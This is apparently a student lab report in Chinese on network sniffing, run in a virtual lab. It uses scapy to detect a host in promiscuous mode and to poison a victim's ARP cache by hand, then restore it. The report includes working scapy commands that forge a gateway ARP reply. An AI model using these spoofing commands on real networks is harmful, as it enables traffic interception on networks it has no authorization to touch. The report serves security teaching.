# 第四章 网络监听
### 网络拓扑
- 拓扑图
  ![网络拓扑](./img/0%20%E6%8B%93%E6%89%91%E5%9B%BE.jpg)
- 网关地址
  ![网关地址](./img/1%20%E7%BD%91%E5%85%B3%E5%9C%B0%E5%9D%80.png)
- 攻击者地址
  ![攻击者](./img/2%20%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%B0%E5%9D%80.png)
- 受害者地址
  ![受害者](./img/3%20%E5%8F%97%E5%AE%B3%E8%80%85%E5%9C%B0%E5%9D%80.png)
### 实验准备
#### 安装scapy
```
# 安装 python3
sudo apt update && sudo apt install python3 python3-pip

# ref: https://scapy.readthedocs.io/en/latest/installation.html#latest-release
pip3 install scapy[complete]
```
- 攻击者成功安装python3
  ![成功安装](./img/4%20%E6%88%90%E5%8A%9F%E5%AE%89%E8%A3%85.png)
- 进入scapy
  ![进入scapy](./img/5%20%E8%BF%9B%E5%85%A5scapy.png)
### 实验一：检测局域网中的异常终端
#### 实验过程
```
# 在受害者主机上检查网卡的「混杂模式」是否启用
ip link show eth0
```
![检查混杂模式](./img/6%20%E6%A3%80%E6%9F%A5%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F.png)
```
# 在攻击者主机上开启 scapy
sudo scapy
```
![攻击者开启scapy](./img/7%20%E6%94%BB%E5%87%BB%E8%80%85%E5%BC%80%E5%90%AFscapy.png)
```
# 在 scapy 的交互式终端输入以下代码回车执行
pkt = promiscping("172.16.111.136")
```
![交互模式输入](./img/8%20%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%BC%8F%E8%BE%93%E5%85%A5.png)
```
# 回到受害者主机上开启网卡的『混杂模式』
# 注意上述输出结果里应该没有出现 PROMISC 字符串
# 手动开启该网卡的「混杂模式」
sudo ip link set eth0 promisc on
# 此时会发现输出结果里多出来了 PROMISC 
ip link show eth0
```
![开启混杂模式](./img/9%20%E5%BC%80%E5%90%AF%E6%B7%B7%E6%9D%82%E6%A8%A1%E5%BC%8F.png)
```
# 回到攻击者主机上的 scapy 交互式终端继续执行命令
# 观察两次命令的输出结果差异
pkt = promiscping("172.16.111.136")
```
![前后对比](./img/10%20%E5%89%8D%E5%90%8E%E5%AF%B9%E6%AF%94.png)
```
# 在受害者主机上
# 手动关闭该网卡的「混杂模式」
sudo ip link set eth0 promisc off
```
![关闭混杂](./img/11%20%E5%85%B3%E9%97%AD%E6%B7%B7%E6%9D%82.png)
#### 实验思考
- 查阅资料后了解到混杂模式与普通模式区别，故只有在混杂模式下，受害者主机才能收到该数据包
    ```
    混杂模式：接收所有经过网卡的数据包，包括不是发给本机的包，即不验证MAC地址
    普通模式：网卡只接收发给本机的包
    ```
### 实验二：手工单步“毒化”目标主机的 ARP 缓存
#### 实验步骤
##### 获取当前局域网的网关 MAC 地址
```
# 构造一个 ARP 请求
arpbroadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="172.16.111.1")

# 查看构造好的 ARP 请求报文详情
arpbroadcast.show()
```
![构造数据包](./img/12%20%E6%9E%84%E9%80%A0%E6%95%B0%E6%8D%AE%E5%8C%85.png)
```
# 发送这个 ARP 广播请求
recved = srp(arpbroadcast, timeout=2)

# 网关 MAC 地址如下
gw_mac = recved[0][0][1].hwsrc
```
![获取网关mac地址](./img/14%20%E8%8E%B7%E5%8F%96%E7%BD%91%E5%85%B3mac%E5%9C%B0%E5%9D%80.png)
##### 伪造网关数据包
```
# 准备发送给受害者主机
# ARP 响应的目的 MAC 地址设置为攻击者主机的 MAC 地址
# 这里要注意按照课件的代码试不能“毒化”的，需要在外面加一层Ethernet帧头
arpspoofed = Ether()/ARP(op=2, psrc="172.16.111.1", pdst="172.16.111.136", hwdst="08:00:27:8e:e8:91")

# 发送上述伪造的 ARP 响应数据包到受害者主机
sendp(arpspoofed)
```
![伪造数据包](./img/13%20%E4%BC%AA%E9%80%A0%E7%BD%91%E5%85%B3%E5%93%8D%E5%BA%94%E5%8C%85.png)

此时在受害者主机上查看 ARP 缓存会发现网关的 MAC 地址已被「替换」为攻击者主机的 MAC 地址
```
ip neigh
```
![成功被污染](./img/15%20%E6%88%90%E5%8A%9F%E8%A2%AB%E6%B1%A1%E6%9F%93.png)
##### 恢复受害者主机的 ARP 缓存记录
```
## 伪装网关给受害者发送 ARP 响应
restorepkt1 = Ether()/ARP(op=2, psrc="172.16.111.1", hwsrc="08:00:27:06:c0:26", pdst="172.16.111.136", hwdst="08:00:27:31:95:0c")
sendp(restorepkt1, count=100, inter=0.2)
```
![伪装网关](./img/16%20%E4%BC%AA%E8%A3%85%E7%BD%91%E5%85%B3.png)
此时在受害者主机上准备“刷新”网关 ARP 记录。
```
## 在受害者主机上尝试 ping 网关
ping 172.16.111.1
## 静候几秒 ARP 缓存刷新成功，退出 ping
## 查看受害者主机上 ARP 缓存，已恢复正常的网关 ARP 记录
ip neigh
```
![恢复正常](./img/17%20%E6%81%A2%E5%A4%8D%E6%AD%A3%E5%B8%B8.png)
### 参考链接
- [一文详解ARP协议](https://www.cnblogs.com/cxuanBlog/p/14265315.html)
- [python利用scapy模块发送arp包](https://blog.csdn.net/weixin_43803070/article/details/95582344)